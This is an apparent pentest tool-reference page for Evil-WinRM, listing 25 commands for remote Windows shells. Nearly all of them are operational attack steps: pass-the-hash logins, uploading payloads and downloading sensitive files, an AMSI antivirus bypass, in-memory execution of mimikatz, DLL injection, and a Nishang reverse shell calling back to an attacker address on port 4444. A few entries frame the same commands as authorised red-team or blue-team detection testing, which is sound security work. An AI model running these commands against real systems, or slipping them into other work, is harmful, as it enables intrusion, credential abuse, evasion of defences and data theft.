# Evil-WinRM

> The go-to WinRM shell for penetration testers: upload and download files, load PowerShell scripts and pass the hash.

- Category: Lateral Movement
- Commands: 25
- Page: https://terminal.rokibulroni.com/tool/lateral/evil-winrm
- Homepage: https://github.com/Hackplayers/evil-winrm
- Documentation: https://github.com/Hackplayers/evil-winrm#usage
- Tags: WinRM, PowerShell, Windows

## Install

- apt: `sudo apt install evil-winrm`
- other: `gem install evil-winrm`

## Basic Remote Connection

### evil-winrm -i 192.168.1.10 -u Administrator -p 'Password123!'

```bash
evil-winrm -i 192.168.1.10 -u Administrator -p 'Password123!'
```

Establishes a basic interactive WinRM PowerShell session using plaintext credentials.


## Authentication Handling

### evil-winrm -i 192.168.1.10 -u Administrator -H '32132132132132132132132132132132'

```bash
evil-winrm -i 192.168.1.10 -u Administrator -H '32132132132132132132132132132132'
```

Performs a Pass-the-Hash attack using an NTLM hash instead of a password.


## Transport Security

### evil-winrm -i 192.168.1.10 -u Administrator -p 'Password123!' -S

```bash
evil-winrm -i 192.168.1.10 -u Administrator -p 'Password123!' -S
```

Enables SSL encryption to connect via WinRM over HTTPS (default port 5986).


## Target Specification

### evil-winrm -i 192.168.1.10 -P 5985 -u Administrator -p 'Password123!'

```bash
evil-winrm -i 192.168.1.10 -P 5985 -u Administrator -p 'Password123!'
```

Specifies a custom port for the WinRM connection, overriding defaults.


## Advanced Authentication

### evil-winrm -i 192.168.1.10 -u Administrator -p 'Password123!' -r CONTOSO.COM

```bash
evil-winrm -i 192.168.1.10 -u Administrator -p 'Password123!' -r CONTOSO.COM
```

Specifies the domain realm for authentication, useful in Kerberos environments.


## Key-Based Authentication

### evil-winrm -i 192.168.1.10 -c public_key.pem -k private_key.pem -S

```bash
evil-winrm -i 192.168.1.10 -c public_key.pem -k private_key.pem -S
```

Authenticates using a client certificate key pair over an SSL encrypted connection.


## Script & Module Loading

### evil-winrm -i 192.168.1.10 -u Administrator -p 'Password123!' -s /opt/scripts

```bash
evil-winrm -i 192.168.1.10 -u Administrator -p 'Password123!' -s /opt/scripts
```

Loads a local directory of PowerShell scripts into the session for easy execution.


## Executable Loading

### evil-winrm -i 192.168.1.10 -u Administrator -p 'Password123!' -e /opt/exes

```bash
evil-winrm -i 192.168.1.10 -u Administrator -p 'Password123!' -e /opt/exes
```

Loads a local directory of executables (ISVs) for in-memory execution.


## Output & Logging

### evil-winrm -i 192.168.1.10 -u Administrator -p 'Password123!' -l

```bash
evil-winrm -i 192.168.1.10 -u Administrator -p 'Password123!' -l
```

Enables logging to save session output to files for later analysis.


## Interactive File Transfer

### upload /local/path/payload.exe C:\Windows\Temp\payload.exe

```bash
upload /local/path/payload.exe C:\Windows\Temp\payload.exe
```

Uploads a file from the attacker machine to the remote target within the session.

### download C:\Windows\Temp\sensitive.docx /local/path/sensitive.docx

```bash
download C:\Windows\Temp\sensitive.docx /local/path/sensitive.docx
```

Downloads a file from the remote target to the attacker machine within the session.


## Defense Evasion

### Bypass-4MSI

```bash
Bypass-4MSI
```

Executes the built-in AMSI bypass command to disable antivirus scanning for the session.


## Interactive Session Handling

### menu

```bash
menu
```

Displays the loaded scripts and modules available for execution in the current session.


## Lateral Movement Simulation

### Invoke-Binary /opt/exes/mimikatz.exe

```bash
Invoke-Binary /opt/exes/mimikatz.exe
```

Executes a loaded binary directly in memory using Invoke-Binary to avoid disk writes.


## Service Execution

### evil-winrm -i 192.168.1.10 -u Administrator -H 'NTLM_HASH' -S

```bash
evil-winrm -i 192.168.1.10 -u Administrator -H 'NTLM_HASH' -S
```

Combines Pass-the-Hash with SSL for a secure, authenticated lateral movement channel.


## URL-Based Connection

### evil-winrm -i https://example.com:5986/wsman -u Administrator -p 'Password123!'

```bash
evil-winrm -i https://example.com:5986/wsman -u Administrator -p 'Password123!'
```

Connects to a specific WinRM URL endpoint, useful for complex network routings.


## Operational Security

### evil-winrm -i 192.168.1.10 -u Administrator -p 'Password123!' -N

```bash
evil-winrm -i 192.168.1.10 -u Administrator -p 'Password123!' -N
```

Disables color output, useful for scripting or terminals that do not support ANSI colors.


## PowerShell Script Execution

### Invoke-PowerShellTcp -Reverse -IPAddress 192.168.1.5 -Port 4444

```bash
Invoke-PowerShellTcp -Reverse -IPAddress 192.168.1.5 -Port 4444
```

Executes a loaded PowerShell script (e.g., Nishang) from the menu to trigger a callback.


## Enumeration Workflow

### evil-winrm -i 192.168.1.10 -u Administrator -p 'Password123!' -s /opt/privesc_checks

```bash
evil-winrm -i 192.168.1.10 -u Administrator -p 'Password123!' -s /opt/privesc_checks
```

Starts a session pre-loaded with privilege escalation enumeration scripts for rapid auditing.


## Incident Response Test

### evil-winrm -i 192.168.1.10 -u Administrator -p 'Password123!' -l

```bash
evil-winrm -i 192.168.1.10 -u Administrator -p 'Password123!' -l
```

Simulates an attack while logging all activity to verify blue team log correlation capabilities.


## Dll Injection Workflow

### Dll-Loader -path C:\Windows\Temp\malicious.dll

```bash
Dll-Loader -path C:\Windows\Temp\malicious.dll
```

Uses the built-in Donut-based loader to inject a DLL into a process (requires loaded module).


## Interactive Service Control

### sc.exe query cmdservice

```bash
sc.exe query cmdservice
```

Standard Windows command execution within the Evil-WinRM shell to query service status.


## Blue Team Detection

### evil-winrm -i 192.168.1.10 -u Administrator -H '321...321' -s /opt/atomic_red_team

```bash
evil-winrm -i 192.168.1.10 -u Administrator -H '321...321' -s /opt/atomic_red_team
```

Loads Atomic Red Team scripts to validate detection logic against specific TTPs.


## Remote Host Cleanup

### Remove-Item -Path C:\Windows\Temp\* -Force

```bash
Remove-Item -Path C:\Windows\Temp\* -Force
```

PowerShell command run within the session to clean up artifacts after simulation.


## Exit & Termination

### exit

```bash
exit
```

Cleanly terminates the WinRM session and closes the connection to the remote host.

## Related tools

- [WinRM](https://terminal.rokibulroni.com/tool/lateral/winrm)
- [CrackMapExec / NetExec](https://terminal.rokibulroni.com/tool/lateral/crackmapexec)
- [PsExec](https://terminal.rokibulroni.com/tool/lateral/psexec)
